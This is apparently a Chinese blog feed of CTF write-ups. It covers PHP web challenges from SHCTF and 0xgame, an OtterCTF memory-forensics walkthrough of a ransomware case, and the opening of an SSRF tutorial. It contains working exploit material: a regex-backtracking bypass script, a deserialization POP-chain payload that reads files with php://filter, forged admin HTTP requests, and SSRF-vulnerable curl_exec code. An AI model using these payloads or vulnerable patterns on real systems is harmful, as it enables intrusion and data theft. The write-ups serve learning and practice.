title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;./index.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>];</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no number!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="variable">$code</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no touch!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;2023SHCTF&#x27;</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what do you want&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>绕过<code>if(preg_match(&quot;/[0-9]/&quot;, $num))</code>:因为preg_match第二个参数必须是string类型，当我们传入数组num[]&#x3D;1时，preg_match函数会报错，返回false。而后面intval函数的第一个参数是mixed：接受多种不同的数据类型，所以返回的是1，进入内层if。</p><p><code>if(preg_match(&#39;/.+?SHCTF/is&#39;, $code))</code>绕过：字符串数量超过1000000时，preg_match函数会挂掉，后面再接上payload就不会被匹配到，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;very&quot;</span>*<span class="number">250000</span>+<span class="string">&quot;2023SHCTF&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/?num[]=1&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://112.6.51.212:30458&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;c[ode&#x27;</span>:code          <span class="comment">#这边[到php当中会被当做_</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url+payload,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231006153514460.png" alt="image-20231006153514460"></p><h2 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h2><p><img src="/img/image-20231011114101333.png" alt="image-20231011114101333"></p><p>我们需要知道最后要的include在milaoshu类里，我们开始反推，<code>$this-&gt;gao=$this-&gt;fei;</code>把milaoshu赋给$this-&gt;fei触发<code>__tostring()</code>，然后musca中的<code>return $this-&gt;ding-&gt;dong; </code>把misca赋给<code>$this-&gt;ding</code>触发<code>_get</code>,到达__wakeup()，执行unserialize()时，先会调用这个函数，即到达入口。</p><p>整个逻辑是传入序列化后的payload，反序列化的时候触发__wakeup()，然后到get再到tostring()，非常清晰。<br>数组绕过check，但是发现</p><p><img src="/img/image-20231011114947899.png" alt="image-20231011114947899"></p><p>这是因为get中调用了miaomiao，把Mikey Mouse~赋值给了成员属性$a,而后面的die括号中是$a,即终止程序并输出括号里的值作为报错信息，不管别的，这里没有输出include+伪协议的内容，那么我们就想到把报错信息改成伪协议读取。$this-&gt;gao&#x3D;$this-&gt;fei;触发的tostring，就添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct()&#123;</span><br><span class="line">    $this-&gt;a=&amp;$this-&gt;gao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wanna[fl.ag=a:1:&#123;i:0;O:5:&quot;musca&quot;:2:&#123;s:4:&quot;ding&quot;;O:5:&quot;misca&quot;:3:&#123;s:3:&quot;gao&quot;;N;s:3:&quot;fei&quot;;O:8:&quot;milaoshu&quot;:1:&#123;s:1:&quot;v&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;s:1:&quot;a&quot;;R:4;&#125;s:4:&quot;dong&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure><p>注意参数中的_要改成[</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class misca&#123;</span><br><span class="line">    public $gao;</span><br><span class="line">    public $fei;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a=&amp;$this-&gt;gao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class musca&#123;</span><br><span class="line">    public $ding;</span><br><span class="line">    public $dong;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class milaoshu&#123;</span><br><span class="line">    public $v=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new misca();</span><br><span class="line">$b = new musca();</span><br><span class="line">$c = new milaoshu();</span><br><span class="line">$a-&gt;fei = $c;</span><br><span class="line">$b-&gt;ding = $a;</span><br><span class="line">echo serialize(array($b));</span><br></pre></td></tr></table></figure><h2 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">API：url/generate_invitation  </span><br><span class="line">Request：POST application/json  </span><br><span class="line">Body：&#123;  </span><br><span class="line">    &quot;name&quot;: &quot;Yourname&quot;,  </span><br><span class="line">    &quot;imgurl&quot;: &quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>根据题目要求直接改包</p><p><img src="/img/image-20231102114828021.png" alt="image-20231102114828021"></p><p>这样看是有数据的</p><p><img src="/img/image-20231102114924326.png" alt="image-20231102114924326"></p><p>放包，下载下来一个图片</p><p><img src="/img/image-20231102115001804.png" alt="image-20231102115001804">****</p><p><img src="/img/image-20231102115032865.png" alt="image-20231102115032865"></p><h2 id="0xgame"><a href="#0xgame" class="headerlink" title="0xgame"></a>0xgame</h2><p>###[Week 1] signin </p><p><img src="/img/image-20231001110256175.png" alt="image-20231001110256175"></p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=QNKCDZO&amp;b=s878926199a HTTP/1.1</span><br><span class="line">Host: 120.27.148.152:50014</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line">Origin: http://120.27.148.152:50014</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: name=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">Referer: http://120.27.148.152:50014/?a=QNKCDZO&amp;b=s878926199a</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">c=1024.1a</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231001105621221.png" alt="image-20231001105621221"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?query=ctf HTTP/1.1</span><br><span class="line">Host: 120.27.148.152:50012</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: role=admin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 14</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">action=getflag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 练习赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OtterCTF内存取证wp</title>
      <link href="/OtterCTF%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81wp.html"/>
      <url>/OtterCTF%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81wp.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>故事背景是一个叫Rick瑞克的喜欢玩老式游戏的人，而且这人吧还总喜欢用比特彗星下载盗版电影种子，游戏种子，有一天他边玩游戏边下东西，突然电脑中了勒索病毒，文件被锁了，所有后缀变成了.locked，然后取证分析人员拷贝了内存镜像文件，来看看你能从被锁的文件中获取什么信息？</p><h2 id="1-What-the-password"><a href="#1-What-the-password" class="headerlink" title="1 - What the password?"></a>1 - What the password?</h2><p>题目：你得到了瑞克电脑内存的样本，你能得到他的用户密码吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem imageinfo</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231004110808864.png"></p><p>镜像版本为Win7SP1x64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=&quot;Win7SP1x64&quot; lsadump</span><br></pre></td></tr></table></figure><p>这里发现我的kali在root模式运行这条指令会报错，用户模式就可以</p><p>lsadump可以强制显示密码</p><p><img src="/./../img/image-20231003165745271.png" alt="image-20231003165745271"></p><p>flag{MortyIsReallyAnOtter}</p><h2 id="2-General-Info"><a href="#2-General-Info" class="headerlink" title="2-General Info"></a>2-General Info</h2><p>题目：电脑主机全称和IP地址是什么？</p><p>通过网络连接查看ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=&quot;Win7SP1x64&quot; netscan</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003171518518.png" alt="image-20231003171518518"></p><p>IP地址：192.168.202.131</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=&quot;Win7SP1x64&quot; printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003171816388.png" alt="image-20231003171816388"></p><p>主机名：WIN-LO6FAF3DTFE，这是最直接的方法，还有一种就是，首先我们知道所有用户信息都会存储到注册表上，所以我们去查看注册表，找到注册表下的SYSTEM系统信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f  OtterCTF.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址(第一级)</p><p><img src="/./../img/image-20231003185737061.png" alt="image-20231003185737061"></p><p>第一级发现只是目录,而文件的位置使用偏移量来表示，0x开头，使用参数-o，printkey打印出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f  OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003185936033.png" alt="image-20231003185936033"></p><p>继续深入下一层路径，\REGISTRY\MACHINE\SYSTEM\ControlSet001，-K是大K代表指定路径的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001&quot;</span><br></pre></td></tr></table></figure><p>最后到”ControlSet001\Control\ComputerName\ComputerName”路径找到主机名</p><h2 id="3-Play-Time"><a href="#3-Play-Time" class="headerlink" title="3-Play Time"></a>3-Play Time</h2><p>题目：瑞克只喜欢玩一些老式的电子游戏。你能看出他在玩什么游戏吗？服务器的ip地址是什么？</p><p>查看进程，寻找那个游戏的身影</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003184645319.png" alt="image-20231003184645319"></p><p>发现进程LunarMS.exe，pid&#x3D;708</p><p><img src="/./../img/image-20231003195325365.png" alt="image-20231003195325365"></p><p><img src="/./../img/image-20231003194853154.png" alt="image-20231003194853154"></p><p>flag{LunarMS-77.102.199.102}</p><h2 id="4-Name-Game1"><a href="#4-Name-Game1" class="headerlink" title="4-Name Game1"></a>4-Name Game1</h2><p>题目：我们知道账号登录到一个频道叫Lunar-3，这个账号名是？</p><p>分析：听名字就知道和刚才那个lunar游戏有关，所以我们先提取一下LunarMS.exe这个进程，然后配合strings命令查找关键词Lunar-3，并匹配上下10行，寻找疑似账号.</p><p>将进程提取出来，可以创个文件夹保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D ./dump</span><br></pre></td></tr></table></figure><p>memdump：提取进程，需要指定进程-p 和输出目录 -D</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./dump/708.dmp | grep -C 10 &quot;Lunar-3&quot;</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003200813332.png" alt="image-20231003200813332"></p><p>linux<code> strings</code>命令：在对象文件或二进制文件中查找可打印的字符串</p><p><code>grep</code>[选项] [模式] [文件名]</p><p>这一个也可以<code>strings 708.dmp &gt; 708.dmp.strings</code>将708.dmp中的字符串输出到.strings文件中，然后<code>grep -C 10 “Lunar-3” ./dump708.dmp.strings</code>但是没有必要</p><p>在线linux命令查询：<a href="https://www.lzltool.com/LinuxCommand">https://www.lzltool.com/LinuxCommand</a></p><p>flag{0tt3r8r33z3}</p><h2 id="5-Name-Game2"><a href="#5-Name-Game2" class="headerlink" title="5-Name Game2"></a>5-Name Game2</h2><p>题目：通过一些研究，我们发现登录角色的用户名总是在这个签名之后：0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}，Rick的角色名字是什么？</p><p>分析：题目意思是16进制64后6-8位是16进制40 16进制06，再18位后是十六进制5a 十六进制0c 十六进制00。根据这个提示，我们可以将第四题dump下来的文件内容用grep进行筛选有十六进制5a 十六进制0c 十六进制00的片段，并往前进行确认，但这里需要用到kali自带的16进制查看器hexhump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C ./dump/708.dmp | grep &quot;5a 0c 00&quot; -A 3 -B 3</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003202031453.png" alt="image-20231003202031453"></p><p>flag{M0rtyL0L}</p><h2 id="6-Silly-Rick"><a href="#6-Silly-Rick" class="headerlink" title="6-Silly Rick"></a>6-Silly Rick</h2><p>题目:傻瑞克总是忘记电子邮件的密码，所以他使用在线存储密码服务来存储他的密码。他总是复制和粘贴密码，这样他就不会出错。瑞克的邮箱密码是什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003202519961.png" alt="image-20231003202519961"></p><p>flag{M@il_Pr0vid0rs}</p><h2 id="7-Hide-And-Seek"><a href="#7-Hide-And-Seek" class="headerlink" title="7-Hide And Seek"></a>7-Hide And Seek</h2><p>题目：我们提取了瑞克电脑内存镜像的原因是有一个恶意软件感染，请找到恶意软件的进程名称，包括恶意扩展名，为下一步分析加密密钥做准备。</p><p>使用命令pstree查看进程树，最可疑的是PPID大于PID的进程。PID指进程号，操作系统里每打开一个程序都会创建一个进程ID，即PID。PID是各进程的代号，每个进程有唯一的PID编号，它是进程运行时系统分配的。PPID则代表当前进程的父进程ID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003203114342.png" alt="image-20231003203114342"></p><p>发现可疑进程vmware-tray.exe，而且发现Rick And Morty.exe就是它的父进程</p><p>具体为什么他是恶意程序，我们进行深入挖掘一下,用dlllist命令打印每个进程加载的动态链接库列表，-p指向pid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003203802650.png" alt="image-20231003203802650"></p><p>发现了他在Temp目录下运行，要知道Temp是windows下的临时文件夹，一般程序不会放在此文件夹中，放在此文件夹中的程序一般为恶意程序。</p><p>也可以查看进程调用的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 cmdline -p 3820,3720</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003204410287.png" alt="image-20231003204410287"></p><p>flag{vmware-tray.exe}</p><h2 id="8-Path-To-Glory1"><a href="#8-Path-To-Glory1" class="headerlink" title="8-Path To Glory1"></a>8-Path To Glory1</h2><p>题目：恶意软件是怎么进入瑞克的电脑的？这一定是一种古老的违法习惯</p><p>根据上面的命令调用，恶意软件是被下载下来的</p><p>filescan：扫描所有文件列表,通过关键字Rick And Morty，查找可能与恶意软件进入电脑有关的文件，因为前言中说到rick用种子下载盗版电影、游戏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 filescan | grep &#x27;Rick And Morty&#x27;</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003205825806.png" alt="image-20231003205825806"></p><p>有6个文件，3个种子文件和3个exe文件，先将种子文件分别dump下来，进行分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007dae9350 -D ./dump</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003210149931.png" alt="image-20231003210149931"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./dump/file.None.0xfffffa801b42c9e0.dat </span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003210501369.png" alt="image-20231003210501369"></p><p>查看第二个种子文件时，发现website，说明是通过网站下载的</p><p><img src="/./../img/image-20231003205251617.png" alt="image-20231003205251617"></p><p>种子文件就是记载下载文件的存放位置、大小、下载服务器的地址、发布者的地址等数据的一个索引文件</p><p>flag{M3an_T0rren7_4_R!cke}</p><h2 id="9-Path-To-Glory2"><a href="#9-Path-To-Glory2" class="headerlink" title="9-Path To Glory2"></a>9-Path To Glory2</h2><p>题目：在恶意软件进入后继续搜索</p><p>其实单看题目根本不知道要干什么，其实这题就是承接上一题，发现是从网站上下载的，自然想到浏览器，所以我们转存所有chrome的进程，然后使用strings命令配合grep命令查找Rick And Morty下载的相关数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -n chrome -D ./dump </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./dump/* | grep &#x27;Rick And Morty season 1 download.exe&#x27; -C 10</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003212236116.png" alt="image-20231003212236116"></p><p>感觉题目就是提示flag的位置，但是flag好像和具体题目没什么关系</p><p>flag{Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear}</p><h2 id="10-Bit-4-Bit"><a href="#10-Bit-4-Bit" class="headerlink" title="10-Bit 4 Bit"></a>10-Bit 4 Bit</h2><p>题目：我们已经发现这个恶意软件是一个勒索软件。查找攻击者的比特币地址(其实就是说请逆向并分析)</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D ./dump</span><br></pre></td></tr></table></figure><p>procdump：进程转储成可执行文件</p><p>直接搜索address，就可发现出flag</p><p><img src="/./../img/image-20231003213854852.png" alt="image-20231003213854852"></p><p>或者根据题目中的提示“ransomware”，就直接找出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -e l  OtterCTF.vmem | grep -i -A 5 &quot;ransomware&quot;</span><br></pre></td></tr></table></figure><p><img src="/./../img/image-20231003214135080.png" alt="image-20231003214135080"></p><p>flag{1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M}</p><h2 id="11-Graphic’s-For-The-Weak"><a href="#11-Graphic’s-For-The-Weak" class="headerlink" title="11-Graphic’s For The Weak"></a>11-Graphic’s For The Weak</h2><p>题目：恶意软件的图形中有一些可疑之处</p><p>foremost分离可执行文件，图片上就是flag</p><p><img src="/./../img/image-20231003214517900.png" alt="image-20231003214517900"></p><h2 id="12-Recovery"><a href="#12-Recovery" class="headerlink" title="12-Recovery"></a>12-Recovery</h2><p>题目：瑞克得把他的文件找回来！用来加密文件的随机密码是说明？</p>]]></content>
      
      
      
        <tags>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/ssrf.html"/>
      <url>/ssrf.html</url>
      
        <content type="html"><![CDATA[<h2 id="ssrf简介"><a href="#ssrf简介" class="headerlink" title="ssrf简介"></a>ssrf简介</h2><p>ssrf即服务器端请求伪造，利用服务器可以请求本地和内网中其他ip的权限，攻击者通过构造服务器请求，实现本地文件、信息获取和对内网中的ip进行端口扫描等。<br>漏洞成因：服务端提供了从其他服务器和本地获取数据的功能且没有对目标地址做过滤与限制，如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载</p><h2 id="ssrf中常用伪协议"><a href="#ssrf中常用伪协议" class="headerlink" title="ssrf中常用伪协议"></a>ssrf中常用伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file://:访问本地文件系统</span><br><span class="line">http/s:探测内网主机存活</span><br><span class="line">dict:泄露安装软件版本信息，查看端口，操作内网redis服务</span><br><span class="line">Gopher:利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求</span><br></pre></td></tr></table></figure><h2 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a>涉及函数</h2><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p> curl_exec函数用于执行指定的cURL会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); //设置为0表示禁用所有错误报告</span><br><span class="line">highlight_file(__FILE__);  //在浏览器中高亮显示当前脚本文件的源代码，__FILE__是一个魔术常量，表示当前脚本的文件名</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];  //初始化了一个CURL会话并将指定的URL作为参数传递给它</span><br><span class="line">$ch=curl_init($url); </span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);  //设置CURL会话的选项，将HEADER选项设置为0，表示不包括HTTP响应头部信息</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置CURL会话的选项，将RETURNTRANSFER选项设置为1，表示将抓取的内容作为字符串返回，而不是直接输出到浏览器。</span><br><span class="line">$result=curl_exec($ch);  //执行CURL会话，抓取指定URL的内容，并将结果存储在&quot;$result&quot;变量中</span><br><span class="line">curl_close($ch);  //关闭CURL会话，释放与之相关的资源</span><br><span class="line">echo ($result); //显示在用户的浏览器中</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>实现从指定的URL地址抓取内容并将其显示在浏览器中，相当于一个ssrf漏洞代码<br>利用：post传参<code>url=127.0.0.1/flag.php</code></p><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p>打开一个网络连接或者一个Unix套接字连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 